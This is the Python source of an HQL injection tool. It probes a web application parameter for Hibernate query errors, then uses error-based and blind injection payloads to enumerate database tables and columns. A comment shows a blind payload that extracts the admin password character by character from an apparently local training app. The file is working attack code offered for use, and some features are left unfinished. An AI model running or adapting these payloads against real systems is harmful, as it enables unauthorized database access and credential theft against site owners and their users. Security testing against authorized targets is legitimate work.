from urlparse import urlparse, parse_qs
from bs4 import BeautifulSoup
import urllib
import optparse
import requests
import sys
import json
import re

COOKIE = ""
TABLES = {}
VERBOSE_MODE = False

def send_HTTP_request(url, params):
    global COOKIE

    # Create HTTP headers
    headers = {'cookie': COOKIE}

    url = url + '?' + urllib.urlencode(params)
    req = requests.get(url, headers=headers)
    return req

def check_if_host_vulnerable(url, params, param_to_test):
    params[param_to_test][0] = "'"

    # print params
    req = send_HTTP_request(url, params)
    # print req.content
    if ('org.hibernate.QueryException' in req.content):
        print "Host seems vulnerable."
    else:
        raise Exception('No Query Exception in the HTTP response.')

def list_columns(url, params, param_to_test):

    global TABLES
    columns = []
    params[param_to_test][0] = "' and test=1 and ''='"

    # print params
    req = send_HTTP_request(url, params)
    # print req.content
    if ('not found; SQL statement' in req.content):
        # pattern for the columns
        pattern = re.compile(r'(([a-zA-Z_-]+)[0-9]+_\.([a-zA-Z0-9_-]+)\s)')
        for res in re.findall(pattern, req.content):
            table_name = res[1]
            column_name = res[2]

            insert_table_name_in_tables(table_name)
            insert_column_in_table(table_name, column_name)
            # if (table_name not in TABLES):
            #     TABLES[table_name] = []
            #     print "[!] Table found : " + table_name
            # if (column_name not in TABLES[table_name]):
            #     TABLES[table_name].append(column_name)
            #     print "[!] Column found : " + column_name
    else:
        raise Exception('We cannot manage to retrieve columns.')
    

def column_exists(message):
    if ('No data type for node: org.hibernate.hql.ast.tree.IdentNode' in message):
        return True
    else:
        return False

def table_exists(message):
    if ('is not mapped' in message):
        return False
    else:
        return True

def enumerate_tables_and_columns():
    global TABLES

    display_message("[-] Enumerating extracted information")
    for table in TABLES:
        print "[" + table + "]"
        for column in TABLES[table]:
            print "\t" + column

def remove_new_line_from_string(string, char=''):
    return string[:-1] + char

def blind_hqli_injection_tables(url, params, param_to_test, file_table, blind_hqli_message):
    global TABLES

    tables_to_test = []
    with open(file_table) as f:
        tables_to_test = f.readlines()

    # removing new line
    for table in tables_to_test:
        table = remove_new_line_from_string(table)
        params[param_to_test][0] = "'and (select test from " + table + " where test = 1) >= 'p'or ''='"
        # print params[param_to_test][0]
        req = send_HTTP_request(url, params)
        if (table_exists(req.content)):
            insert_table_name_in_tables(table)
        else:
            display_message("[-] Table " + table + " does not exist.")            

def insert_table_name_in_tables(table_name):
    global TABLES
    if (table_name not in TABLES):
        print "[!] Table " + table_name + " has been found."
        TABLES[table_name] = []
    else:
        display_message("[-] Table " + table_name + " has been found (again).")

def insert_column_in_table(table_name, column_name):
    global TABLES

    if (table_name not in TABLES):
        raise Exception('This might be a problem with ' + table_name)

    if (column_name not in TABLES[table_name]):
        TABLES[table_name].append(column_name)
        print "[!] Column " + column_name + " has been found in table " + table_name
    else:
        display_message("[-] Column " + column_name + " has been found in table " + table_name + " (again)")


def display_message(message):
    global VERBOSE_MODE
    if (VERBOSE_MODE):
        print message

# Blind SQLi
# http://localhost:9110/ropeytasks/task/search?q=%27and%20%28select%20substring%28password,1,1%29%20from%20User%20where%20username=%27admin%27%29%20%3E=%20%27p%27or%20%27%27=%27&search=Search
# 'and (select substring(password,1,1) from User where username='admin') >= 'p'or ''='
#SELECT COUNT(*) FROM   INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='TABLE';

# option parser
parser = optparse.OptionParser()
parser.add_option('--url', help='qURL to pentest', dest='url')
parser.add_option('--param', help='Param to test', dest='param')
parser.add_option('--cookie', help='Cookie to test it', dest='cookie', default=None)
# parser.add_option('--T', help='List tables', dest='list_tables', default=False, action='store_true')
parser.add_option('--blind', help='Message appearing while Blind HQLi', dest='blind_hqli_message', default=None)
parser.add_option('--table_name_file', help='Name for tables', dest='file_table', default='db/tables.db')
parser.add_option('--column_name_file', help='Name for columns', dest='file_column', default='db/columns.db')
parser.add_option('--results', help='Enumerate results after session', dest='results', default=False, action='store_true')
parser.add_option('--verbose', help='Verbose mode', dest='verbose', default=False, action='store_true')

# TODO: Check for mandatory parameters
# mandatory params to check
# mandatory_params = ['url', 'param']

if (len(sys.argv) <= 2):
    parser.print_help()
else:
    (opts, args) = parser.parse_args()
    # Setting cookie and verbose mode
    COOKIE = opts.cookie
    VERBOSE_MODE = opts.verbose

    # check for param
    params = parse_qs(urlparse(opts.url).query)
    if (opts.param not in params):
        raise Exception('Param not in URL!')

    url = opts.url.split('?')[0]
    check_if_host_vulnerable(url, params, opts.param)

   # list columns
    # list_columns(url, params, opts.param)

    # check if blind hql injection must be done
    if (opts.blind_hqli_message is not None):
        blind_hqli_injection_tables(url, params, opts.param, opts.file_table, opts.blind_hqli_message)
        # blind_hqli_injection_columns(url, params, opts.param, opts.file_column, opts.blind_hqli_message)

    # enumerate tables and columns found if flag passed
    if (opts.results):
        enumerate_tables_and_columns()